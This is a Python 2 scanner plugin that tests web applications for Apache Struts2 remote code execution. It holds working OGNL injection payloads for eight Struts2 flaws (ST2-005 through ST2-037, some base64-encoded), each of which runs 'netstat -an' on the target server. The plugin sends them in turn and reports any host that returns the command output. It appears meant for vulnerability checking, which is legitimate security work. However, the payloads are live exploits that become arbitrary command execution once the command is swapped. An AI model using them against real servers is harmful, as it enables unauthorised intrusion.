#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from lib.common import *
import urlparse
import base64

def check(url, method, data, headers):
    if '.action' in url or '.do' in url:
        return True
    return False

def check_vul(html):
    if 'Active Internet connections' in html:
        return True
    elif 'Active Connections' in html:
        return True
    elif 'LISTENING' in html:
        return True
    elif 'ESTABLISHED' in html:
        return True
    else:
        return False
def run(url, method, data, headers, proxy_headers=None):
    get_url = url.split('?')[0]
    headers = get_headers(url, method, data, headers, proxy_headers)
    headers['Accept'] = "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*"
    headers['Content-Type'] = "application/x-www-form-urlencoded"
    poc = {
                "ST2-005":base64.b64decode("KCdcNDNfbWVtYmVyQWNjZXNzLmFsbG93U3RhdGljTWV0aG9kQWNjZXNzJykoYSk9dHJ1ZSYoYikoKCdcNDNjb250ZXh0W1wneHdvcmsuTWV0aG9kQWNjZXNzb3IuZGVueU1ldGhvZEV4ZWN1dGlvblwnXVw3NWZhbHNlJykoYikpJignXDQzYycpKCgnXDQzX21lbWJlckFjY2Vzcy5leGNsdWRlUHJvcGVydGllc1w3NUBqYXZhLnV0aWwuQ29sbGVjdGlvbnNARU1QVFlfU0VUJykoYykpJihnKSgoJ1w0M215Y21kXDc1XCduZXRzdGF0IC1hblwnJykoZCkpJihoKSgoJ1w0M215cmV0XDc1QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKFw0M215Y21kKScpKGQpKSYoaSkoKCdcNDNteWRhdFw3NW5ld1w0MGphdmEuaW8uRGF0YUlucHV0U3RyZWFtKFw0M215cmV0LmdldElucHV0U3RyZWFtKCkpJykoZCkpJihqKSgoJ1w0M215cmVzXDc1bmV3XDQwYnl0ZVs1MTAyMF0nKShkKSkmKGspKCgnXDQzbXlkYXQucmVhZEZ1bGx5KFw0M215cmVzKScpKGQpKSYobCkoKCdcNDNteXN0clw3NW5ld1w0MGphdmEubGFuZy5TdHJpbmcoXDQzbXlyZXMpJykoZCkpJihtKSgoJ1w0M215b3V0XDc1QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpJykoZCkpJihuKSgoJ1w0M215b3V0LmdldFdyaXRlcigpLnByaW50bG4oXDQzbXlzdHIpJykoZCkp"),
                "ST2-009":'''class.classLoader.jarPath=%28%23context["xwork.MethodAccessor.denyMethodExecution"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess["allowStaticMethodAccess"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27netstat -an%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]''',
                "ST2-013":base64.b64decode("YT0xJHsoJTIzX21lbWJlckFjY2Vzc1siYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MiXT10cnVlLCUyM2E9QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKCduZXRzdGF0IC1hbicpLmdldElucHV0U3RyZWFtKCksJTIzYj1uZXcramF2YS5pby5JbnB1dFN0cmVhbVJlYWRlciglMjNhKSwlMjNjPW5ldytqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKCUyM2IpLCUyM2Q9bmV3K2NoYXJbNTAwMDBdLCUyM2MucmVhZCglMjNkKSwlMjNzYnRlc3Q9QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldFdyaXRlcigpLCUyM3NidGVzdC5wcmludGxuKCUyM2QpLCUyM3NidGVzdC5jbG9zZSgpKX0="),
                "ST2-016":base64.b64decode("cmVkaXJlY3Q6JHslMjNyZXElM2QlMjNjb250ZXh0LmdldCglMjdjbyUyNyUyYiUyN20ub3BlbiUyNyUyYiUyN3N5bXBob255Lnh3byUyNyUyYiUyN3JrMi5kaXNwJTI3JTJiJTI3YXRjaGVyLkh0dHBTZXIlMjclMmIlMjd2bGV0UmVxJTI3JTJiJTI3dWVzdCUyNyksJTIzcyUzZG5ldyUyMGphdmEudXRpbC5TY2FubmVyKChuZXclMjBqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIoJTI3bmV0c3RhdCUyMC1hbiUyNy50b1N0cmluZygpLnNwbGl0KCUyN1xccyUyNykpKS5zdGFydCgpLmdldElucHV0U3RyZWFtKCkpLnVzZURlbGltaXRlciglMjdcXEElMjcpLCUyM3N0ciUzZCUyM3MuaGFzTmV4dCgpPyUyM3MubmV4dCgpOiUyNyUyNywlMjNyZXNwJTNkJTIzY29udGV4dC5nZXQoJTI3Y28lMjclMmIlMjdtLm9wZW4lMjclMmIlMjdzeW1waG9ueS54d28lMjclMmIlMjdyazIuZGlzcCUyNyUyYiUyN2F0Y2hlci5IdHRwU2VyJTI3JTJiJTI3dmxldFJlcyUyNyUyYiUyN3BvbnNlJTI3KSwlMjNyZXNwLnNldENoYXJhY3RlckVuY29kaW5nKCUyN1VURi04JTI3KSwlMjNyZXNwLmdldFdyaXRlcigpLnByaW50bG4oJTIzc3RyKSwlMjNyZXNwLmdldFdyaXRlcigpLmZsdXNoKCksJTIzcmVzcC5nZXRXcml0ZXIoKS5jbG9zZSgpfQ=="),
                "ST2-019":base64.b64decode("ZGVidWc9Y29tbWFuZCZleHByZXNzaW9uPSNmPSNfbWVtYmVyQWNjZXNzLmdldENsYXNzKCkuZ2V0RGVjbGFyZWRGaWVsZCgnYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MnKSwjZi5zZXRBY2Nlc3NpYmxlKHRydWUpLCNmLnNldCgjX21lbWJlckFjY2Vzcyx0cnVlKSwjcmVxPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVxdWVzdCgpLCNyZXNwPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVzcG9uc2UoKS5nZXRXcml0ZXIoKSwjYT0obmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlcihuZXcgamF2YS5sYW5nLlN0cmluZ1tdeyduZXRzdGF0JywnLWFuJ30pKS5zdGFydCgpLCNiPSNhLmdldElucHV0U3RyZWFtKCksI2M9bmV3IGphdmEuaW8uSW5wdXRTdHJlYW1SZWFkZXIoI2IpLCNkPW5ldyBqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKCNjKSwjZT1uZXcgY2hhclsxMDAwMF0sI2QucmVhZCgjZSksI3Jlc3AucHJpbnRsbigjZSksI3Jlc3AuY2xvc2UoKQ=="),
                "ST2-DEV":'''?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=netstat%20-an''',
                "ST2-032":'''?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=netstat -an&pp=____A&ppp=%20&encoding=UTF-8''',
                "ST2-037":'''/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=netstat -an''',
          }
    try:
        #ST2-005
        code, head, html = http_request_post(url, poc['ST2-005'], headers=headers, allow_redirects=True)
        if check_vul(html):
            details = 'Struts2_005 %s' % (url)
            target = urlparse.urlparse(url).netloc
            return {'target':target, 'type':'Struts2', 'info':details}
        #ST2-009
        code, head, html = http_request_post(url, poc['ST2-009'], headers=headers, allow_redirects=True)
        if check_vul(html):
            details = 'Struts2_009 %s' % (url)
            target = urlparse.urlparse(url).netloc
            return {'target':target, 'type':'Struts2', 'info':details}
        #ST2-013
        code, head, html = http_request_post(url, poc['ST2-013'], headers=headers, allow_redirects=True)
        if check_vul(html):
            details = 'Struts2_013 %s' % (url)
            target = urlparse.urlparse(url).netloc
            return {'target':target, 'type':'Struts2', 'info':details}
        #ST2-016
        code, head, html = http_request_post(url, poc['ST2-016'], headers=headers, allow_redirects=True)
        if check_vul(html):
            details = 'Struts2_016 %s' % (url)
            target = urlparse.urlparse(url).netloc
            return {'target':target, 'type':'Struts2', 'info':details}
        #ST2-019
        code, head, html = http_request_post(url, poc['ST2-019'], headers=headers, allow_redirects=True)
        if check_vul(html):
            details = 'Struts2_019 %s' % (url)
            target = urlparse.urlparse(url).netloc
            return {'target':target, 'type':'Struts2', 'info':details}
        #ST2-DEV
        code, head, html = http_request_get(get_url + poc['ST2-DEV'], headers=headers, allow_redirects=True)
        if check_vul(html):
            details = 'Struts2_Dev %s' % (url)
            target = urlparse.urlparse(url).netloc
            return {'target':target, 'type':'Struts2', 'info':details}
        #ST2-032
        code, head, html = http_request_get(get_url + poc['ST2-032'], headers=headers, allow_redirects=True)
        if check_vul(html):
            details = 'Struts2_032 %s' % (url)
            target = urlparse.urlparse(url).netloc
            return {'target':target, 'type':'Struts2', 'info':details}
        #ST2-037
        code, head, html = http_request_get(get_url + poc['ST2-037'], headers=headers, allow_redirects=True)
        if check_vul(html):
            details = 'Struts2_037 %s' % (url)
            target = urlparse.urlparse(url).netloc
            return {'target':target, 'type':'Struts2', 'info':details}
    except Exception, e:
        pass


def verify(task):
    message = {
        "method": "",
        "url" : "",
        "param" : "",
        "type" : "struts rce",
        "info" : "",
    }

    url = task['url']
    method = task['method']
    headers = task['request_header']
    data = task['request_content'] if method == 'POST' else None


    result = run(url, method, data, headers)
    if result:
        message['method'] = method
        message['url'] = url
        message['info'] = result['info']
        save_to_databases(message)
        result = (True, message)
    else:
        result = (False, {})
    return result


if __name__ == '__main__':
    task = {
        'url': 'http://127.0.0.1:8080/',
        'request_header': {
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-GB,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': 'http://127.0.0.1:8000/vulnerabilities/exec/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': 'sessions=%7B%7D; csrftoken=71w812VAMB8nvVNcYgOmwW6ftN8igDyZsqE9FHz2MsGdQpgdmwpl1jzG2iE7YwLZ; sessionid=x4phtuh6qv5zhpcu46v1xlszto8pbib1; PHPSESSID=ktd1uec9ekucj6afr284i5bks6; security=low; hibext_instdsigdipv2=1',
        },
        'request_content': '',
        'method': 'GET'
    }
    print verify(task)
